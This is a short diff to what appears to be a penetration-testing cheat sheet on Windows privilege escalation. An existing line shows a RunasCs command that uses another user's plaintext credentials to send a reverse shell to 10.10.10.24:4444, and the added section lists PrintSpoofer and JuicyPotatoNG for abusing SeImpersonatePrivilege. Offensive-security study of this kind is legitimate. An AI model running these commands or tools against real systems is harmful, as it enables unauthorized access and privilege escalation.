@@ -59,3 +59,8 @@ If you get a revershell a something and you have credentials of another user, ju
 ```powershell
 RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
 ```
+
+## Abusing SeImpersonatePrivilege
+Use these tools :
+https://github.com/itm4n/PrintSpoofer
+https://github.com/antonioCoco/JuicyPotatoNG
